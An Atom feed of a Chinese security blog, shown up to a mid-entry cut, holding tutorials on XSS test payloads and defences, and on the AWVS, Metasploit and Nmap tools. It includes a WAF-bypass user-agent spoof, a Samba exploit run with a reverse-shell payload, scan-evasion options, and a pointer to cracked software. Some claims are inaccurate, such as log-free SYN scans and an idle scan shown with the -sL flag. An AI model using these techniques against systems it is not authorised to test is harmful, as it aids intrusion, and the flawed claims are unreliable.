<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Secer</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-08-14T12:32:14.086Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>shiqian</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XSS跨站脚本漏洞</title>
    <link href="http://yoursite.com/2018/08/14/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/14/XSS跨站脚本漏洞/</id>
    <published>2018-08-14T09:19:05.000Z</published>
    <updated>2018-08-14T12:32:14.086Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁花一场梦</p><h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS又叫CSS  (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</p><h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><p>第一种：反射型XSS 简单的把用户数据反射给浏览器，需要用户点击</p><p>第二种：存储型XSS 把用户输入的数据存储在服务器中</p><p>第三种：DOM Based XSS 通过修改DOM节点的反射型xss</p><h1 id="检测漏洞存在"><a href="#检测漏洞存在" class="headerlink" title="检测漏洞存在"></a>检测漏洞存在</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img  src= javascript:alert(&quot;1&quot;)&gt;&lt;/img&gt;</span><br><span class="line"></span><br><span class="line">&lt;img   dynsrc= javascript:alert(&quot;1&quot;)&gt;&lt;/img&gt;</span><br><span class="line"></span><br><span class="line">&lt;div  style= &quot;background-image:url(  javascript:alert(&apos;1&apos;) )&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;font style=&quot;TEST:expression(alert(&apos;1&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h1><p>存储式XSS构成：</p><p><img src="\images\pasted-86.png" alt="upload successful"></p><p>反射式XSS构成：</p><p><img src="\images\pasted-87.png" alt="upload successful"></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>1.对html中不可信字符串进行html转义</p><p>2.对html属性中不可信的字符串进行HTML转义</p><p>3.对javascript字符串中不可信的html先进行html转义，再JavaScript转义</p><p>4.使用白名单，使用UTF-8为默认的字符的字符编码</p><p>5.设置HttpOnly和htmlspecialchars</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web安全基础</title>
    <link href="http://yoursite.com/2018/08/14/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2018/08/14/Web安全基础/</id>
    <published>2018-08-14T07:06:05.000Z</published>
    <updated>2018-08-14T09:14:41.491Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁花一场梦</p><p><img src="\images\pasted-78.png" alt="upload successful"></p><h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p><img src="\images\pasted-79.png" alt="upload successful"></p><h1 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h1><p><img src="\images\pasted-80.png" alt="upload successful"></p><h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p><img src="\images\pasted-81.png" alt="upload successful"></p><p>### </p><h1 id="请求伪造漏洞"><a href="#请求伪造漏洞" class="headerlink" title="请求伪造漏洞"></a>请求伪造漏洞</h1><p><img src="\images\pasted-82.png" alt="upload successful"></p><h1 id="文件处理漏洞"><a href="#文件处理漏洞" class="headerlink" title="文件处理漏洞"></a>文件处理漏洞</h1><p><img src="\images\pasted-83.png" alt="upload successful"></p><h1 id="访问控制漏洞"><a href="#访问控制漏洞" class="headerlink" title="访问控制漏洞"></a>访问控制漏洞</h1><p><img src="\images\pasted-84.png" alt="upload successful"></p><h1 id="会话管理漏洞"><a href="#会话管理漏洞" class="headerlink" title="会话管理漏洞"></a>会话管理漏洞</h1><p><img src="\images\pasted-85.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>AWVS使用指北</title>
    <link href="http://yoursite.com/2018/08/14/AWVS%E6%8C%87%E5%8D%97/"/>
    <id>http://yoursite.com/2018/08/14/AWVS指南/</id>
    <published>2018-08-14T05:54:05.000Z</published>
    <updated>2018-08-14T06:58:01.327Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-58.png" alt="upload successful"></p><h1 id="AWVS介绍"><a href="#AWVS介绍" class="headerlink" title="AWVS介绍"></a>AWVS介绍</h1><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的 Web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流 行安全漏洞。 它包含有收费和免费两种版本，AWVS官方网站是： <a href="http://www.acunetix.com/，目前最新版是V11版本，官方下载地址：" target="_blank" rel="noopener">http://www.acunetix.com/，目前最新版是V11版本，官方下载地址：</a> <a href="https://www.acunetix.com/vulnerability-scanner/download/，" target="_blank" rel="noopener">https://www.acunetix.com/vulnerability-scanner/download/，</a> 官方免费下载的是试用14天的版本。    吾爱破解网站上有完整的安装破解过程</p><h1 id="AWVS优点"><a href="#AWVS优点" class="headerlink" title="AWVS优点"></a>AWVS优点</h1><p>自动的客户端脚本分析器，允许对 Ajax 和 Web 2.0 应用程序进行安全性测 试。</p><p>业内最先进且深入的 SQL 注入和跨站脚本测试 </p><p>高级渗透测试工具，例如 HTTP Editor 和 HTTP Fuzzer </p><p>可视化宏记录器帮助您轻松测试 web 表格和受密码保护的区域</p><p> 支持含有 CAPTHCA 的页面，单个开始指令和 Two Factor（双因素）验证 机制 </p><p>丰富的报告功能，包括 VISA PCI 依从性报告 </p><p>高速的多线程扫描器轻松检索成千上万个页面 i)、智能爬行程序检测 web 服务器类型和应用程序语言</p><p>Acunetix 检索并分析网站，包括 flash 内容、 SOAP 和 AJAX </p><p>端口扫描 web 服务器并对在服务器上运行的网络服务执行安全检查 l)、可导出网站漏洞文件    </p><h1 id="AWVS菜单栏"><a href="#AWVS菜单栏" class="headerlink" title="AWVS菜单栏"></a>AWVS菜单栏</h1><p><img src="\images\pasted-59.png" alt="upload successful"></p><h1 id="AWVS工具栏"><a href="#AWVS工具栏" class="headerlink" title="AWVS工具栏"></a>AWVS工具栏</h1><p><img src="\images\pasted-60.png" alt="upload successful"></p><p>从左到右分别是：</p><p>新建扫描——网站扫描——网站爬行——目标查找——目标探测——子域名扫描——SQL盲注——HTTP编辑——HTTP嗅探——HTTP Fuzzer——认证测试——结果对比——WSDL扫描——WSDL编辑测试——程序设置——扫描设置——侧重扫描设置——计划任务——报告</p><p>对于AWVS最常用的应该就是站点扫描了</p><h1 id="AWVS-新建扫描"><a href="#AWVS-新建扫描" class="headerlink" title="AWVS 新建扫描"></a>AWVS 新建扫描</h1><p>点击菜单栏的 New Scan 新建一次扫描， 网站扫描开始前，需要<br>设定下面选项:<br>1). Scan type<br>2). Options<br>3). Target<br>4). Login<br>5). Finsh</p><h3 id="AWVS-新建扫描——Scan-type"><a href="#AWVS-新建扫描——Scan-type" class="headerlink" title="AWVS 新建扫描——Scan type"></a>AWVS 新建扫描——Scan type</h3><p><img src="\images\pasted-75.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Options"><a href="#AWVS-新建扫描——Options" class="headerlink" title="AWVS 新建扫描——Options"></a>AWVS 新建扫描——Options</h3><p><img src="\images\pasted-76.png" alt="upload successful"></p><h4 id="Options——Scanning-profile"><a href="#Options——Scanning-profile" class="headerlink" title="Options——Scanning profile"></a>Options——Scanning profile</h4><p>设置侧重扫描的类型，包含16种侧重检测类型</p><p><img src="\images\pasted-63.png" alt="upload successful"></p><h5 id="Scanning-Profiles-scripts"><a href="#Scanning-Profiles-scripts" class="headerlink" title="Scanning Profiles scripts"></a>Scanning Profiles scripts</h5><p><img src="\images\pasted-64.png" alt="upload successful"></p><h3 id="Options——Scan-Setting"><a href="#Options——Scan-Setting" class="headerlink" title="Options——Scan Setting"></a>Options——Scan Setting</h3><p><img src="\images\pasted-74.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Advanced"><a href="#AWVS-新建扫描——Advanced" class="headerlink" title="AWVS 新建扫描——Advanced"></a>AWVS 新建扫描——Advanced</h3><p><img src="\images\pasted-67.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Target"><a href="#AWVS-新建扫描——Target" class="headerlink" title="AWVS 新建扫描——Target"></a>AWVS 新建扫描——Target</h3><p><img src="\images\pasted-68.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Login"><a href="#AWVS-新建扫描——Login" class="headerlink" title="AWVS 新建扫描——Login"></a>AWVS 新建扫描——Login</h3><p><img src="\images\pasted-69.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Finish"><a href="#AWVS-新建扫描——Finish" class="headerlink" title="AWVS 新建扫描——Finish"></a>AWVS 新建扫描——Finish</h3><p><img src="\images\pasted-70.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——结果（一）"><a href="#AWVS-新建扫描——结果（一）" class="headerlink" title="AWVS 新建扫描——结果（一）"></a>AWVS 新建扫描——结果（一）</h3><p><img src="\images\pasted-71.png" alt="upload successful"></p><p><img src="\images\pasted-77.png" alt="upload successful"><br>扫描的结果能看到发现漏洞所用的payload，对应的HTTP头信息、HTML、可发送到HTTP Editor中等</p><h3 id="AWVS-新建扫描——结果（二）"><a href="#AWVS-新建扫描——结果（二）" class="headerlink" title="AWVS 新建扫描——结果（二）"></a>AWVS 新建扫描——结果（二）</h3><p><img src="\images\pasted-72.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——导出"><a href="#AWVS-新建扫描——导出" class="headerlink" title="AWVS 新建扫描——导出"></a>AWVS 新建扫描——导出</h3><p><img src="\images\pasted-73.png" alt="upload successful"></p><h1 id="AWVS扫描小技巧"><a href="#AWVS扫描小技巧" class="headerlink" title="AWVS扫描小技巧"></a>AWVS扫描小技巧</h1><h3 id="1-文件头加"><a href="#1-文件头加" class="headerlink" title="1.文件头加"></a>1.文件头加</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br></pre></td></tr></table></figure><p>可以绕过狗，waf等<br>另外如果很容易把对方扫死的话，可以在第一项limit number…..，这里是最大的并发连接数默认是10，可以改低为2-5， 某些WAF对访问请求时间太快会进行拦截，可以进行延迟发包，在Delay between 默认是0，改为1-5</p><h3 id="2-设置cookie"><a href="#2-设置cookie" class="headerlink" title="2.设置cookie"></a>2.设置cookie</h3><p>表单验证用户某些页面，例如扫描后台、扫描用户登录后可访问的页面时候，需要登录用户密码验证再进行扫描，可以设置cookie 来解决</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit使用指南</title>
    <link href="http://yoursite.com/2018/08/14/Metasploit%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <id>http://yoursite.com/2018/08/14/Metasploit使用指南/</id>
    <published>2018-08-14T02:29:05.000Z</published>
    <updated>2018-08-14T03:12:34.872Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-57.png" alt="upload successful"></p><h1 id="什么是Metasploit"><a href="#什么是Metasploit" class="headerlink" title="什么是Metasploit"></a>什么是Metasploit</h1><p>Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。 </p><h1 id="metasploit的启动"><a href="#metasploit的启动" class="headerlink" title="metasploit的启动"></a>metasploit的启动</h1><h3 id="安装metasploit"><a href="#安装metasploit" class="headerlink" title="安装metasploit"></a>安装metasploit</h3><p><code>apt-get install metasploit-framework</code></p><h3 id="启动metasploit"><a href="#启动metasploit" class="headerlink" title="启动metasploit"></a>启动metasploit</h3><p><code>msfconsole</code></p><h1 id="攻击开始"><a href="#攻击开始" class="headerlink" title="攻击开始"></a>攻击开始</h1><h3 id="查找相关模块"><a href="#查找相关模块" class="headerlink" title="查找相关模块"></a>查找相关模块</h3><p>我们可以通过search命令查找相关的扫描脚本。</p><p>命令格式：<code>search Name</code>      如<code>search samba</code></p><h3 id="使用use调度模块"><a href="#使用use调度模块" class="headerlink" title="使用use调度模块"></a>使用use调度模块</h3><p>找到了我们需要攻击的目标模块，我们就使用它，</p><p>通过命令：<code>use ExploitName</code>    如<code>use exploit/multi/samba/usermap_script。</code></p><h3 id="使用info查看模块信息"><a href="#使用info查看模块信息" class="headerlink" title="使用info查看模块信息"></a>使用info查看模块信息</h3><p>metasploit使用info查看模块信息 </p><h3 id="选择payload作为攻击"><a href="#选择payload作为攻击" class="headerlink" title="选择payload作为攻击"></a>选择payload作为攻击</h3><p>选择payload，首先我们要看能使用哪些参数，通过命令：<code>show payloads</code><br>在选择攻击载荷的时候，建议选用和meterpreter和reverse相关的载荷，</p><p>通过使用命令：<code>set payload PayloadName</code>如 set payload cmd/unix/reverse</p><h3 id="metasploit设置攻击参数"><a href="#metasploit设置攻击参数" class="headerlink" title="metasploit设置攻击参数"></a>metasploit设置攻击参数</h3><p>首先通过<code>show options</code>或者options，查看需要填写的参数</p><p>用set命令填充参数</p><h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><p><code>run</code></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Nmap使用指北</title>
    <link href="http://yoursite.com/2018/08/13/Nmap%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/"/>
    <id>http://yoursite.com/2018/08/13/Nmap使用指北/</id>
    <published>2018-08-13T14:26:05.000Z</published>
    <updated>2018-08-13T15:19:24.153Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><p>Nmap是一个非常强大的工具，它具有覆盖渗透测试的第一方面的能力，其中包括信息的收集和统计它可以适用于winodws,linux,mac等操作系统。Nmap是一款非常强大的实用工具,可用于：</p><p>检测活在网络上的主机（主机发现）<br>检测主机上开放的端口（端口发现或枚举）<br>检测到相应的端口（服务发现）的软件和版本<br>检测操作系统，硬件地址，以及软件版本<br>检测脆弱性的漏洞（Nmap的脚本）</p><h2 id="参数使用"><a href="#参数使用" class="headerlink" title="参数使用"></a>参数使用</h2><h4 id="扫描单一的一个主机："><a href="#扫描单一的一个主机：" class="headerlink" title="扫描单一的一个主机："></a>扫描单一的一个主机：</h4><p><code>nmap cnblogs.com</code></p><p><code>nmap 192.168.1.2</code></p><h4 id="扫描整个子网"><a href="#扫描整个子网" class="headerlink" title="扫描整个子网:"></a>扫描整个子网:</h4><p><code>nmap 192.168.1.1/24</code></p><h4 id="扫描多个目标："><a href="#扫描多个目标：" class="headerlink" title="扫描多个目标："></a>扫描多个目标：</h4><p><code>nmap 192.168.1.2 192.168.1.5</code></p><h4 id="扫描一个范围内的目标："><a href="#扫描一个范围内的目标：" class="headerlink" title="扫描一个范围内的目标："></a>扫描一个范围内的目标：</h4><p><code>nmap 192.168.1.1-100 (扫描IP地址为192.168.1.1-192.168.1.100内的所有主机)</code></p><h4 id="如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下-扫描这个txt内的所有主机："><a href="#如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下-扫描这个txt内的所有主机：" class="headerlink" title="如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机："></a>如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机：</h4><p><code>nmap -iL target.txt</code></p><h4 id="扫描的所有主机的列表"><a href="#扫描的所有主机的列表" class="headerlink" title="扫描的所有主机的列表:"></a>扫描的所有主机的列表:</h4><p><code>nmap -sL 192.168.1.1/24</code></p><h4 id="扫描除过某一个ip外的所有子网主机："><a href="#扫描除过某一个ip外的所有子网主机：" class="headerlink" title="扫描除过某一个ip外的所有子网主机："></a>扫描除过某一个ip外的所有子网主机：</h4><p><code>nmap 192.168.1.1/24 -exclude 192.168.1.1</code></p><h4 id="扫描除过某一个文件中的ip外的子网主机命令："><a href="#扫描除过某一个文件中的ip外的子网主机命令：" class="headerlink" title="扫描除过某一个文件中的ip外的子网主机命令："></a>扫描除过某一个文件中的ip外的子网主机命令：</h4><p><code>nmap 192.168.1.1/24 -exclude file xxx.txt  (xxx.txt中的文件将会从扫描的主机中排除)</code></p><h4 id="扫描特定主机上的80-21-23端口："><a href="#扫描特定主机上的80-21-23端口：" class="headerlink" title="扫描特定主机上的80,21,23端口："></a>扫描特定主机上的80,21,23端口：</h4><p><code>nmap -p80,21,23 192.168.1.1</code></p><h2 id="深入扫描"><a href="#深入扫描" class="headerlink" title="深入扫描"></a>深入扫描</h2><h4 id="半开放扫描-，不会在目标主机上产生任何日志记录"><a href="#半开放扫描-，不会在目标主机上产生任何日志记录" class="headerlink" title="半开放扫描 ，不会在目标主机上产生任何日志记录"></a>半开放扫描 ，不会在目标主机上产生任何日志记录</h4><p><code>nmap -sS 192.168.1.1</code></p><p>Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势. </p><h4 id="找出TCP和UDP端口"><a href="#找出TCP和UDP端口" class="headerlink" title="找出TCP和UDP端口"></a>找出TCP和UDP端口</h4><p><code>nmap -sT 192.168.1.1</code></p><p>TCP connect()扫描就是默认的扫描模式.不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口. </p><h4 id="找目标主机打开的UDP端口，不需要发送任何的SYN包"><a href="#找目标主机打开的UDP端口，不需要发送任何的SYN包" class="headerlink" title="找目标主机打开的UDP端口，不需要发送任何的SYN包"></a>找目标主机打开的UDP端口，不需要发送任何的SYN包</h4><p><code>nmap -sU 192.168.1.1</code></p><p>它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的. </p><h4 id="为规避防火墙，发送一个设置了FIN标志且不需要完成TCP的握手的数据包"><a href="#为规避防火墙，发送一个设置了FIN标志且不需要完成TCP的握手的数据包" class="headerlink" title="为规避防火墙，发送一个设置了FIN标志且不需要完成TCP的握手的数据包"></a>为规避防火墙，发送一个设置了FIN标志且不需要完成TCP的握手的数据包</h4><p><code>nmap -sF 192.168.1.8</code></p><p>FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一) </p><h4 id="ping扫描，只用于找出主机是否是存在在网络中"><a href="#ping扫描，只用于找出主机是否是存在在网络中" class="headerlink" title="ping扫描，只用于找出主机是否是存在在网络中"></a>ping扫描，只用于找出主机是否是存在在网络中</h4><p><code>nmap -sP 192.168.1.1</code></p><h4 id="版本检测"><a href="#版本检测" class="headerlink" title="版本检测"></a>版本检测</h4><p><code>nmap -sV 192.168.1.1</code> </p><p>不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口. </p><h4 id="匿名扫描技术"><a href="#匿名扫描技术" class="headerlink" title="匿名扫描技术"></a>匿名扫描技术</h4><p><code>nmap -sL 192.168.1.6 192.168.1.1</code></p><p>不是用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包. Idle scan是一种理想的匿名扫描技术,通过目标网络中的192.168.1.6向主机192.168.1.1发送数据，来获取192.168.1.1开放的端口</p><h4 id="OS检测（O）"><a href="#OS检测（O）" class="headerlink" title="OS检测（O）"></a>OS检测（O）</h4><p><code>nmap -O  192.168.199.111</code>  </p><p>能够远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库，该数据库包含超过2600操作系统的信息。 Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照</p><h4 id="不ping远程主机"><a href="#不ping远程主机" class="headerlink" title="不ping远程主机"></a>不ping远程主机</h4><p><code>nmap -O -PN 192.168.1.1/24</code></p><p>如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会挡掉ping请求.-PN命令告诉Nmap不用ping远程主机。 使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现 </p><h4 id="猜测功能"><a href="#猜测功能" class="headerlink" title="猜测功能"></a>猜测功能</h4><p><code>nmap -O –osscan-guess 192.168.1.1</code></p><p>通过Nmap准确的检测到远程操作系统是比较困难的，需要使用到Nmap的猜测功能选项, –osscan-guess 猜测认为最接近目标的匹配操作系统类型</p><h1 id="官网文档："><a href="#官网文档：" class="headerlink" title="官网文档："></a>官网文档：</h1><p>Nmap 7.60SVN（<a href="https://nmap.org）" target="_blank" rel="noopener">https://nmap.org）</a></p><p>用法：nmap [扫描类型] [选项] {目标规范}</p><h4 id="目标规格："><a href="#目标规格：" class="headerlink" title="目标规格："></a>目标规格：</h4><p> 可以传递主机名，IP地址，网络等。</p><p> 例如：scanme.nmap.org，microsoft.com / 24,192.168.0.1; 10.0.0-255.1-254</p><p> -iL <inputfilename>：从主机/网络列表输入</inputfilename></p><p> -iR <num hosts="">：选择随机目标</num></p><p> –exclude <host1 [，host2]="" [，host3]，...="">：排除主机/网络</host1></p><p> –excludefile &lt;exclude_file&gt;：从文件中排除列表</p><h4 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h4><p>  -sL：列表扫描 - 只列出要扫描的目标</p><p>  -sn：Ping扫描 - 禁用端口扫描</p><p>  -Pn：将所有主机视为在线 - 跳过主机发现</p><p>  -PS / PA / PU / PY [端口列表]：TCP SYN / ACK，UDP或SCTP发现到给定端口</p><p>  -PE / PP / PM：ICMP回送，时间戳和网络掩码请求发现探测</p><p>  -PO [协议列表]：IP协议Ping</p><p>  -n / -R：从不进行DNS解析/始终解析[默认：有时]</p><p>  –dns-servers <serv1 [，serv2]，...="">：指定自定义DNS服务器</serv1></p><p>  –system-dns：使用OS的DNS解析器</p><p>  –traceroute：每个主机的跟踪跳转路径</p><h4 id="扫描技术："><a href="#扫描技术：" class="headerlink" title="扫描技术："></a>扫描技术：</h4><p>  -sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描</p><p>  -sU：UDP扫描</p><p>  -sN / sF / sX：TCP Null，FIN和Xmas扫描</p><p>  –scanflags <flags>：自定义TCP扫描标志</flags></p><p>  -sI <zombie host="" [：probeport]="">：空闲扫描</zombie></p><p>  -sY / sZ：SCTP INIT / COOKIE-ECHO扫描</p><p>  -sO：IP协议扫描</p><p>  -b &lt;FTP中继主机&gt;：FTP反弹扫描</p><h4 id="港口规格和扫描令："><a href="#港口规格和扫描令：" class="headerlink" title="港口规格和扫描令："></a>港口规格和扫描令：</h4><p>  -p &lt;端口范围&gt;：仅扫描指定的端口</p><p>​    例如：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080，S：9</p><p>  –exclude-ports &lt;端口范围&gt;：从扫描中排除指定的端口</p><p>  -F：快速模式 - 扫描比默认扫描更少的端口</p><p>  -r：连续扫描端口 - 不要随机化</p><p>  –top-ports <number>：扫描<number>最常见的端口</number></number></p><p>  –port-ratio <ratio>：扫描端口比<ratio>更常见</ratio></ratio></p><h4 id="服务-版本检测："><a href="#服务-版本检测：" class="headerlink" title="服务/版本检测："></a>服务/版本检测：</h4><p>  -sV：探测开放端口以确定服务/版本信息</p><p>  –version-intensity <level>：从0（亮）到9（尝试所有探针）设置</level></p><p>  –version-light：限制最可能的探针（强度2）</p><p>  –version-all：尝试每一个探针（强度9）</p><p>  –version-trace：显示详细的版本扫描活动（用于调试）</p><h4 id="脚本扫描："><a href="#脚本扫描：" class="headerlink" title="脚本扫描："></a>脚本扫描：</h4><p>  -sC：相当于–script = default</p><p>  –script = <lua scripts="">：<lua scripts="">是逗号分隔的列表</lua></lua></p><p>​           目录，脚本文件或脚本类别</p><p>  –script-args = <n1 =="" v1，[n2="v2，...]">：为脚本提供参数</n1></p><p>  –script-args-file = filename：在文件中提供NSE脚本args</p><p>  –script-trace：显示发送和接收的所有数据</p><p>  –script-updatedb：更新脚本数据库。</p><p>  –script-help = <lua scripts="">：显示有关脚本的帮助。</lua></p><p>​           <lua scripts="">是以逗号分隔的脚本文件列表或</lua></p><p>​           脚本的类别。</p><h4 id="操作系统检测："><a href="#操作系统检测：" class="headerlink" title="操作系统检测："></a>操作系统检测：</h4><p>  -O：启用OS检测</p><p>  –osscan-limit：将OS检测限制为有希望的目标</p><p>  –osscan-guess：更积极地猜测操作系统</p><h4 id="时间和性能："><a href="#时间和性能：" class="headerlink" title="时间和性能："></a>时间和性能：</h4><p>  采用<time>的选项以秒为单位，或追加’ms’（毫秒），</time></p><p>  该值的’s’（秒），’m’（分钟）或’h’（小时）（例如30m）。</p><p>  -T <0-5>：设置时序模板（越高越快）</0-5></p><p>  –min-hostgroup / max-hostgroup <size>：并行主机扫描组大小</size></p><p>  –min-parallelism / max-parallelism <numprobes>：探测并行化</numprobes></p><p>  –min-rtt-timeout / max-rtt-timeout / initial-rtt-timeout <time>：指定</time></p><p>​      探测往返时间。</p><p>  –max-retries <tries>：端口扫描探测重新传输的上限数量。</tries></p><p>  –host-timeout <time>：在此之后放弃目标</time></p><p>  –scan-delay /  -  max-scan-delay <time>：调整探针之间的延迟</time></p><p>  –min-rate <number>：发送数据包的速度不低于每秒<number></number></number></p><p>  –max-rate <number>：发送数据包的速度不超过每秒<number></number></number></p><h4 id="防火墙-IDS逃脱和防御："><a href="#防火墙-IDS逃脱和防御：" class="headerlink" title="防火墙/ IDS逃脱和防御："></a>防火墙/ IDS逃脱和防御：</h4><p>  -F; –mtu <val>：分段数据包（可选地，具有给定的MTU）</val></p><p>  -D &lt;decoy1，decoy2 [，ME]，…&gt;：用诱饵披露扫描</p><p>  -S &lt;IP_Address&gt;：欺骗源地址</p><p>  -e <iface>：使用指定的接口</iface></p><p>  -g /  -  source-port <portnum>：使用给定的端口号</portnum></p><p>  –proxies &lt;url1，[url2]，…&gt;：通过HTTP / SOCKS4代理中继连接</p><p>  –data <hex string="">：为发送的数据包附加自定义有效负载</hex></p><p>  –data-string <string>：为发送的数据包附加自定义ASCII字符串</string></p><p>  –data-length <num>：将随机数据附加到已发送的数据包</num></p><p>  –ip-options <options>：发送带有指定ip选项的数据包</options></p><p>  –ttl <val>：设置IP生存时间字段</val></p><p>  –spoof-mac &lt;mac地址/前缀/供应商名称&gt;：欺骗你的MAC地址</p><p>  –badsum：使用伪TCP / UDP / SCTP校验和发送数据包</p><p>OUTPUT：</p><p>  -oN / -oX / -oS / -oG <file>：正常输出扫描，XML，s | &lt;rIpt kIddi3，</file></p><p>​     和Grepable格式，分别为给定的文件名。</p><p>  -oA <basename>：一次输出三种主要格式</basename></p><p>  -v：增加详细级别（使用-vv或更高级别以获得更好的效果）</p><p>  -d：提高调试级别（使用-dd或更多以获得更好的效果）</p><p>  –reason：显示端口处于特定状态的原因</p><p>  –open：仅显示打开（或可能打开）的端口</p><p>  –packet-trace：显示发送和接收的所有数据包</p><p>  –iflist：打印主机接口和路由（用于调试）</p><p>  –append-output：追加而不是clobber指定的输出文件</p><p>  –resume <filename>：恢复中止扫描</filename></p><p>  –stylesheet &lt;path / URL&gt;：用于将XML输出转换为HTML的XSL样式表</p><p>  